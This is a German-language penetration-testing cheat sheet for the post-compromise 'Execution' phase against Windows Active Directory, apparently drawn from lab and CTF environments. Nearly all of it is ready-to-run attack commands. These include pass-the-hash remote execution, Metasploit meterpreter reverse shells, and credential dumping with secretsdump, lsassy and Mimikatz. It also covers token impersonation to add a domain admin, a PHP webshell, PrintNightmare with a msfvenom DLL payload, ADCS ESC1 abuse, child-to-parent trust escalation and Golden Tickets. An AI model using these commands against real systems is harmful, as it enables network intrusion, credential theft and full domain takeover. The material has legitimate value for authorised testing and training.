### Execution

## Ziel der Execution Phase

- Ausführung von Code auf kompromittierten Systemen
- Etablierung persistenter Shell-Zugriffe
- Credential Extraction aus Memory und Disk
- Token Manipulation für Privilegien-Escalation
- Deployment von Tools (Mimikatz, etc.)

---

## Remote Code Execution Methoden

### PSExec (Impacket)

#### Mit Domain Credentials


```bash
# Standard Domain-Auth
impacket-psexec marvel.local/mmustermann:'Password1'@192.168.xx.x

# Alternative Systeme
impacket-psexec MARVEL.local/mmustermann:'Password1'@192.168.xx.x
```

#### Mit Hash (Pass-the-Hash)


```bash
# Hash-Format: LM:NT oder :NT
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f Administrator@192.168.xx.x

# Nur NT-Hash verwenden
impacket-psexec administrator@192.168.57.16 -hashes :7facdc498ed1680c4fd1448319a8c04f
```

### WMIExec (Stealth Alternative)


```bash
# Mit Hash via WMI
impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f Administrator@192.168.xx.x
```

**Vorteil:** Nutzt WMI-Objekte statt Service-Erstellung (weniger Logs)

### SMBExec (File-based)


```bash
# File-basierte Execution
impacket-smbexec -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f Administrator@192.168.xx.x

# Mit Credentials
impacket-smbexec MARVEL.local/hawkeye:'Password1@'@192.168.xx.x
```

**Vorteil:** Keine Service-Erstellung, nur ADMIN$ Share-Nutzung

### Evil-WinRM


```bash
# Mit Passwort
evil-winrm -u harry -p 'haxxor@12345' -i 10.10.255.70

# Mit NT-Hash (Pass-the-Hash)
evil-winrm -i 10.10.255.69 -u Administrator -H 15db914be1e6a896e7692f608a9d72ef

# Domain-spezifisch
evil-winrm -u administrator -p 'Password123!' -i 10.10.175.181
```

---

## Metasploit PSExec Module

### Basic Setup


```bash
# Metasploit starten
msfconsole

# PSExec-Modul laden
use exploit/windows/smb/psexec
```

### Konfiguration mit Credentials


```bash
# Payload setzen
set payload windows/x64/meterpreter/reverse_tcp

# Target konfigurieren
set RHOSTS 192.168.xx.x
set SMBUser mmustermann
set SMBPass Password1
set SMBDomain MARVEL.local

# Listener konfigurieren
set LHOST [YOUR_KALI_IP]
set LPORT [YOUR_PORT]

# Optionen prüfen
options

# Exploit ausführen
run
```

### Mit Hash-Authentication


```bash
use exploit/windows/smb/psexec
set RHOSTS 192.168.xx.x
set SMBUser administrator
unset SMBDomain
set SMBPass aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f
run
```

### Shell-Verifikation


```bash
# In Meterpreter Session
shell
whoami
systeminfo
exit
```

---

## CrackMapExec Remote Execution

### Password Spraying mit Execution


```bash
# Authentication testen
crackmapexec smb 192.168.xx.x/24 -u mmustermann -d MARVEL.local -p Password1
```

**Ergebnis-Indikatoren:**

- `[+]` = Erfolgreiche Auth
- `Pwn3d!` = Administrative Privilegien
- `[-]` = Auth fehlgeschlagen

### Pass-the-Hash mit CrackMapExec


```bash
# Netzwerk-weiter PTH
crackmapexec smb 1192.168.xx.x/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth
```

### Command Execution


```bash
# Einzelnen Befehl ausführen
crackmapexec smb 192.168.xx.x -u administrator -H [hash] --local-auth -x "whoami"

# PowerShell Command
crackmapexec smb 192.168.xx.x -u administrator -H [hash] --local-auth -X "Get-Process"
```

### Module Execution


```bash
# Verfügbare Module anzeigen
crackmapexec smb -L

# Mimikatz-Modul ausführen
crackmapexec smb 192.168.xx.x -u administrator -H [hash] --local-auth -M mimikatz
```

---

## Credential Extraction

### Secretsdump (Impacket)

#### Domain Controller Dumping


```bash
# Mit Domain Admin Credentials
impacket-secretsdump MARVEL.local/mmustermann:'Password1'@192.168.xx.x

# Mit Hash
impacket-secretsdump administrator@192.168.xx.x -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f
```

**Extrahiert:**

- SAM Database (lokale Accounts)
- LSA Secrets (cached Domain Credentials)
- Machine Account Credentials
- DPAPI Master Keys

#### NTDS.dit Dumping (Domain Controller)


```bash
# Komplette Domain-Hashes extrahieren
impacket-secretsdump MARVEL.local/hawkeye:'Password1@'@192.168.xx.x

# Nur NTLM Hashes
impacket-secretsdump MARVEL.local/hawkeye:'Password1@'@192.168.xx.x -just-dc-ntlm
```

**Enthält:**

- Alle Domain User Hashes
- krbtgt Hash (für Golden Tickets)
- Machine Account Credentials
- Security Descriptors

#### Trust Domain Dumping


```bash
# Parent Domain
secretsdump.py -hashes :15db914be1e6a896e7692f608a9d72ef trusted.vl/Administrator@10.10.255.69
```

### CrackMapExec Credential Dumping

#### SAM Dumping


```bash
# Automatischer SAM-Dump bei Admin-Zugriff
crackmapexec smb 192.168.xx.x/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth --sam
```

#### LSA Secrets


```bash
# LSA Secrets extrahieren
crackmapexec smb 192.168.xx.x/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth --lsa
```

**LSA Secrets enthalten:**

- Cached Domain Credentials
- Service Account Passwords (oft Klartext)
- Auto-Logon Credentials
- Machine Account Passwords

### lsassy (Memory Dumping)


```bash
# LSASS Memory Dump über Netzwerk
lsassy -u harry -p 'haxxor@12345' -d lab.trusted.vl 10.10.255.70
```

---

## Mimikatz Deployment & Execution

### File Transfer via SMB


```bash
# Working Directory
cd /usr/share/windows-resources/mimikatz/x64/

# Einzelne Uploads (multi-line funktioniert NICHT!)
smbclient //192.168.xx.x/C$ -U MARVEL.local/jdoe -c "put mimikatz.exe Windows\\Temp\\mimikatz.exe"
smbclient //192.168.xx.x/C$ -U MARVEL.local/jdoe -c "put mimidrv.sys Windows\\Temp\\mimidrv.sys"
smbclient //192.168.xx.x/C$ -U MARVEL.local/jdoe -c "put mimilib.dll Windows\\Temp\\mimilib.dll"
smbclient //192.168.xx.x/C$ -U MARVEL.local/jdoe -c "put mimispool.dll Windows\\Temp\\mimispool.dll"
```

### Remote Execution Setup


```bash
# Shell-Zugriff etablieren
impacket-smbexec MARVEL.local/jdoe:Password1@192.168.xx.x
```

### Mimikatz Interactive Mode

cmd

```cmd
# Zum Temp-Verzeichnis
cd C:\Windows\Temp

# Dateien verifizieren
dir mimi*.*

# Mimikatz starten
mimikatz.exe
```

**In Mimikatz Prompt:**

mimikatz

```mimikatz
# Debug-Privilegien aktivieren
privilege::debug

# Verfügbare Module anzeigen
sekurlsa::

# Credentials aus Memory extrahieren
sekurlsa::logonpasswords

# Mimikatz beenden
exit
```

### Direct Execution (Non-Interactive)

cmd

```cmd
# Alle Befehle in einer Zeile
C:\Windows\Temp\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

**Memory Credential Extraction liefert:**

- Domain User Hashes (wenn eingeloggt)
- Machine Account Credentials
- Kerberos Tickets und AES Keys
- DPAPI Master Keys

---

## Token Impersonation (Metasploit)

### Incognito Extension laden


```bash
# In Meterpreter Session
load incognito

# Alle Extensions anzeigen
load -l

# Incognito-Befehle anzeigen
help
```

### Token Discovery


```bash
# User Delegation Tokens anzeigen
list_tokens -u
```

**Typische Tokens:**

- `MARVEL\mmustermann` (Domain User)
- `NT-AUTHORITY\SYSTEM` (Local System)
- Diverse Service Accounts

### Domain User Impersonation


```bash
# Token impersonieren (doppelte Backslashes!)
impersonate_token marvel\\\\mmustermann

# Verifikation
shell
whoami
exit
```

### Zurück zu Original Identity


```bash
# Impersonation zurücksetzen
rev2self

# Aktuelle User ID prüfen
getuid
```

### Domain Administrator Impersonation

_Nach Admin-Login auf Target:_


```bash
# Tokens erneut listen
list_tokens -u

# Administrator Token impersonieren
impersonate_token marvel\\\\administrator

# Verifikation
shell
whoami
```

---

## Domain Privilege Escalation via Token

### Domain User Creation

cmd

```cmd
# In impersonierter Administrator-Shell
net user /add hawkeye Password1@ /domain
```

### Domain Admins Group Addition

cmd

```cmd
# Deutsche Systeme
net group "Domanen-Admins" hawkeye /ADD /DOMAIN

# Englische Systeme
net group "Domain Admins" hawkeye /ADD /DOMAIN
```

### Verification of Domain Control


```bash
# Neuer Terminal auf Kali
impacket-secretsdump MARVEL.local/hawkeye:'Password1@'@192.168.xx.x
```

**Erfolg bei:**

- Komplette NTDS.dit Extraktion
- krbtgt Account Hash
- Alle Domain User Hashes

---

## LNK File Attack (Hash Capture)

### Responder vorbereiten


```bash
# SMB temporär aktivieren
sudo nano /usr/share/responder/Responder.conf
# Ändern: SMB = On

# Responder starten
sudo responder -I eth0 -dwv
```

### Shell Access etablieren


```bash
impacket-smbexec MARVEL.local/hawkeye:'Password1@'@192.168.xx.x
```

### PowerShell LNK Creation

powershell

```powershell
# PowerShell starten
powershell

# LNK-Objekt erstellen
$objShell = New-Object -ComObject WScript.shell
$lnk = $objShell.CreateShortcut("C:\important_document.lnk")
$lnk.TargetPath = "\\192.168.xx.x@test.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Important Document"
$lnk.Save()
```

### Trigger Execution

cmd

````cmd
# LNK-Datei ausführen
C:\important_document.lnk
```

**Erwartete Responder-Ausgabe:**
```
[SMB] NTLMv2-SSP Client   : 192.168.xx.x
[SMB] NTLMv2-SSP Username : MARVEL\hawkeye
[SMB] NTLMv2-SSP Hash     : hawkeye::MARVEL:...
````

### Cleanup


```bash
# Responder Config zurücksetzen
sudo nano /usr/share/responder/Responder.conf
# Ändern: SMB = Off
```

---

## Web-basierte Code Execution

### Webshell via MySQL


```sql
-- PHP Webshell schreiben
SELECT "<?php echo shell_exec($_GET['c']); ?>" 
INTO OUTFILE 'C:/xampp/htdocs/dev/back.php';
```

### Command Execution via Webshell


```bash
# Basis-Command
curl "http://10.10.255.70/dev/back.php?c=whoami"

# URL-encoded Commands
curl "http://10.10.255.70/dev/back.php?c=net%20user%20harry%20haxxor@12345%20/add%20/domain"

# Privilegien-Escalation
curl "http://10.10.255.70/dev/back.php?c=net%20localgroup%20Administrators%20harry%20/add%20/domain"
```

---

## PrintNightmare Exploitation (CVE-2021-1675)

### Modified Impacket Installation


```bash
# Original Impacket entfernen
pip3 uninstall impacket

# cube0x0's modifizierte Version
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```

### Exploit Download


```bash
# Exploit erstellen
mousepad CVE-2021-1675.py
# Raw exploit code von GitHub einfügen: https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py
```

### Payload Generation


```bash
# Malicious DLL erstellen
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.xx.x LPORT=7777 -f dll > shell.dll
```

### Metasploit Listener


```bash
msfconsole
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.xx.x
set LPORT 7777
options
run
```

### SMB Server für Payload


```bash
# SMB-Server im Payload-Verzeichnis starten
smbserver.py share $(pwd) -smb2support
```

### PrintNightmare Execution


````bash
# Exploit ausführen
python3 CVE-2021-1675.py marvel.local/mmustermann:Password1@192.168.xx.x '\\192.168.xx.x\share\shell.dll'

# Alternative Targets
python3 CVE-2021-1675.py marvel.local/mmustermann:Password1@192.168.xx.x '\\192.168.xx.x\share\shell.dll'
python3 CVE-2021-1675.py marvel.local/mmustermann:Password1@192.168.xx.x '\\192.168.xx.x\share\shell.dll'
```

**Erfolgreiche Exploitation:**
```
[*] Sending stage (200262 bytes) to TARGET_IP
[*] Meterpreter session 1 opened
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
````

---

## NFS Privilege Escalation

### UID Spoofing Setup


```bash
# Ziel-User UID ermitteln (via Shell oder Enum)
id peter.turner@hybrid.vl
# Ausgabe: uid=902601108
```

### Lokalen User erstellen


```bash
# User mit identischer UID
useradd --badname -u 902601108 peter.turner@hybrid.vl
```

### SUID Bash Deployment


```bash
# Bash nach NFS-Share kopieren
cp /bin/bash /opt/share/

# SUID Bit setzen (via NFS Mount)
chmod +s /mnt/tmpmnt/bash
```

### Privileged Shell aktivieren


```bash
# Bash mit -p Flag (preserve privileges)
/opt/share/bash -p

# Verifikation
whoami
```

---

## ADCS Certificate Exploitation (ESC1)

### Vulnerable Template Discovery


```bash
# Certipy Vulnerability Scan
certipy-ad find -u peter.turner@hybrid.vl -p 'b0cwR+G4Dzl_rw' -dc-ip 10.10.175.181 -vulnerable
```

**Typisches Finding:**

- Template: HybridComputers (ESC1)

### Machine Account Hash Extraction


```bash
# Aus Keytab-Datei
python3 keytabextract.py krb5.keytab
# Output: NTLM: 0f916c5246fdbc7ba95dcef4126d57bd
```

### Certificate Request (Machine Account)


```bash
# Certificate als Machine Account anfordern
certipy-ad req -u 'MAIL01$' -hashes :0f916c5246fdbc7ba95dcef4126d57bd -ca hybrid-DC01-CA -target 10.10.175.181 -template HybridComputers -upn administrator@hybrid.vl -key-size 4096
```

### PassTheCert Attack


```bash
# Administrator-Passwort via Certificate ändern
python3 passthecert.py -action modify_user -crt admin.crt -key admin.key -domain hybrid.vl -dc-ip 10.10.175.181 -target administrator -new-pass Password123!
```

### Domain Admin Access


```bash
# Mit neuem Passwort einloggen
evil-winrm -i 10.10.175.181 -u administrator -p 'Password123!'
```

---

## Child-to-Parent Domain Escalation

### Domain SID Reconnaissance


```bash
# Child Domain SID
lookupsid.py lab.trusted.vl/harry:'haxxor@12345'@10.10.255.70

# Trust Relationships
ldeep ldap -u harry -p 'haxxor@12345' -d lab.trusted.vl -s ldap://10.10.255.70 trusts
```

### DNS Configuration (Kritisch!)


```bash
# Beide Domains in /etc/hosts
echo "10.10.255.70 lab.trusted.vl labdc.lab.trusted.vl" | sudo tee -a /etc/hosts
echo "10.10.255.69 trusted.vl trusteddc.trusted.vl" | sudo tee -a /etc/hosts
```

### Automated Escalation


```bash
# raiseChild.py ausführen
raiseChild.py lab.trusted.vl/cpowers -hashes :322db798a55f85f09b3d61b976a13c43
```

**Prozess:**

1. Child Domain krbtgt Hash extrahieren
2. Trust Key ermitteln
3. Inter-Realm TGT erstellen
4. Enterprise Admins SID injizieren
5. Parent Domain kompromittieren

### Parent Domain Access


```bash
# NTDS.dit der Parent Domain
secretsdump.py -hashes :15db914be1e6a896e7692f608a9d72ef trusted.vl/Administrator@10.10.255.69

# Shell auf Parent DC
evil-winrm -i 10.10.255.69 -u Administrator -H 15db914be1e6a896e7692f608a9d72ef
```

---

## Golden Ticket Attack

### Auf Domain Controller (Windows)

#### Mimikatz starten

cmd

```cmd
mimikatz.exe
```

#### Debug-Privilegien prüfen

mimikatz

```mimikatz
privilege::debug
```

**Erwartete Ausgabe:** `Privilege '20' OK`

#### krbtgt Hash extrahieren

mimikatz

```mimikatz
lsadump::lsa /inject /name:krbtgt
```

**Wichtig kopieren:**

- Domain SID (z.B. S-1-5-21-...)
- krbtgt NTLM Hash

#### Golden Ticket erstellen

mimikatz

```mimikatz
# Generisches Template
kerberos::golden /User:Administrator /domain:marvel.local /sid:S-1-5-21-... /krbtgt:HASH_HIER /id:500 /ptt

# Beispiel mit fiktivem User
kerberos::golden /User:Batman /domain:marvel.local /sid:S-1-5-21-1234567890-1111111111-2222222222 /krbtgt:8A1B2C3D4E... /id:500 /ptt
```

**Parameter:**

- `/User:` = Beliebiger Username (kann fiktiv sein)
- `/domain:` = Domain FQDN
- `/sid:` = Domain SID
- `/krbtgt:` = krbtgt NTLM Hash
- `/id:` = RID (500 = Administrator)
- `/ptt` = Pass The Ticket (sofort injizieren)

#### CMD mit Golden Ticket

mimikatz

```mimikatz
misc::cmd
```

---

## CrackMapExec Database

### CME Database öffnen


```bash
cmedb
```

**Verfügbare Befehle:**

- `hosts` = Entdeckte Systeme
- `creds` = Gesammelte Credentials
- `shares` = Enumerierte Shares
- `groups` = Domain Groups

---

## Tool-Vergleich

|Tool|Methode|Detection|Use Case|
|---|---|---|---|
|psexec.py|Service Creation|Hoch|Standard Remote Exec|
|wmiexec.py|WMI Objects|Mittel|AV Evasion|
|smbexec.py|File-based (ADMIN$)|Mittel|No Service Creation|
|evil-winrm|WinRM/PowerShell|Niedrig|Interactive Sessions|
|CrackMapExec|Multiple Methods|Variable|Automation|

---

## Troubleshooting

### PSExec/WMIExec Failures


```bash
# Connectivity testen
smbclient -L //192.168.xx.x -U "MARVEL\mmustermann%Password1"

# Credentials verifizieren
crackmapexec smb 192.168.xx.x -u mmustermann -p Password1 -d MARVEL.local

# Firewall/Ports prüfen
nmap -p 445,135,139 192.168.57.15
```

### Mimikatz Execution Issues


```bash
# AV deaktiviert?
# Admin-Rechte vorhanden?
# Dateien korrekt übertragen?

# File-Transfer verifizieren
dir C:\Windows\Temp\mimi*.*

# Execution Policy
powershell -ExecutionPolicy Bypass
```

### Token Impersonation Failures


```bash
# In Meterpreter
# 1. Aktuellen Token prüfen
getuid

# 2. Load incognito erneut
load incognito

# 3. Tokens neu listen
list_tokens -u

# 4. Doppelte Backslashes!
impersonate_token marvel\\\\administrator
```

---

## Success Indicators

### Remote Execution Success

- ✅ Shell-Prompt erscheint
- ✅ `whoami` zeigt erwarteten User
- ✅ Befehle werden ausgeführt
- ✅ Keine Access Denied Errors

### Credential Extraction Success

- ✅ SAM/LSA Hashes extrahiert
- ✅ NTDS.dit vollständig gedumpt
- ✅ krbtgt Hash vorhanden
- ✅ Cleartext Passwords in LSA Secrets

### Token Impersonation Success

- ✅ Administrator Token verfügbar
- ✅ Domain Commands funktionieren
- ✅ `net user /domain` gibt Results
- ✅ Secretsdump auf DC erfolgreich

### Domain Compromise Success

- ✅ Komplette NTDS.dit extrahiert
- ✅ krbtgt Hash für Golden Tickets
- ✅ Domain Admin Account erstellt
- ✅ Access zu allen Systemen
